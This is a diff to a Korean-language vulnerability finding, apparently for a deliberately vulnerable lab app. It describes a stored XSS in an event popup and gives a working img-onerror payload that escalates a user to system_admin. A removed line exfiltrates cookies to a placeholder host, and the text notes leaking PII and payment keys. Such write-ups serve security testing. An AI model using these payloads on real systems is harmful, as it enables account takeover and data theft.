@@ -22,18 +22,24 @@
 
 `admin` 세션으로:
 
+**중요**: 팝업은 `EventPopups.jsx`가 `e.startsAt && e.endsAt`가 모두 있는 이벤트만 렌더한다 — 날짜 없는
+이벤트는 `GET /api/events`엔 있어도 **팝업으로 안 뜨고 XSS도 실행되지 않는다.** 따라서 페이로드에
+`startsAt`(과거)·`endsAt`(미래)를 반드시 넣는다.
+
 ```
-POST /api/{node,java}/events
-{"title":"깜짝 이벤트","body":"<img src=x onerror=\"fetch('/api/node/admin/users/2/role',{method:'PUT',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({role:'system_admin'})})\">","active":true}
+POST /api/{node,java}/events   (admin 세션)
+{"title":"깜짝 이벤트",
+ "body":"<img src=x onerror=\"fetch('/api/node/admin/users/2/role',{method:'PUT',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({role:'system_admin'})})\">",
+ "active":true,
+ "startsAt":"2026-01-01T00:00:00Z","endsAt":"2027-01-01T00:00:00Z"}
 ```
 
 이후 `system_admin`(`9u4a`) 이 홈(`/`) 을 열면 팝업 렌더 시 페이로드가 그의 세션으로
 실행되어 `admin`(user id 2) 을 `system_admin` 으로 승격한다.
 
-- 쿠키 탈취: `<script>new Image().src='https://<collab>/'+document.cookie</script>`
-  — 단 세션 쿠키는 `HttpOnly` 이므로 `document.cookie` 로는 안 나온다. 대신 세션을 탄
-  요청(`fetch('/api/*/profile')` 등)으로 PII·주문 `tossPaymentKey` 유출.
-- `startsAt`/`endsAt` 로 예약 게시도 가능(탐지 회피에 악용 가능).
+- 쿠키 탈취: `<script>...</script>`는 `dangerouslySetInnerHTML`(innerHTML)로 삽입 시 실행되지 않으므로
+  `<img src=x onerror=...>` 형태를 쓴다. 세션 쿠키는 `HttpOnly`라 `document.cookie`엔 안 나오므로,
+  세션을 탄 요청(`fetch('/api/*/profile')` 등)으로 PII·주문 `tossPaymentKey` 유출.
 
 ## 영향
 
@@ -43,8 +49,9 @@ POST /api/{node,java}/events
 
 ## 증거 (재현 확인)
 
-(진단 단계에서 채움) `admin` 세션으로 role-change 페이로드를 담은 이벤트 등록 →
-`9u4a` 로 `/` 접속 → `GET /api/*/admin/users` 에서 `admin` 의 role 이 `system_admin` 으로 바뀜.
+코드 확인(2026-09-01): 저장 경로는 `body` 무정제 저장, 렌더는 `EventPopups.jsx`의
+`dangerouslySetInnerHTML`. 팝업 노출 조건은 `startsAt && endsAt` 존재 — 두 날짜를 채운 이벤트만
+홈에서 팝업으로 떠 페이로드가 실행된다(날짜 없는 문서 예전 페이로드는 미발화였음, 위 트리거로 정정).
 
 ## 조치 상태: 미조치 (의도된 취약점)
 
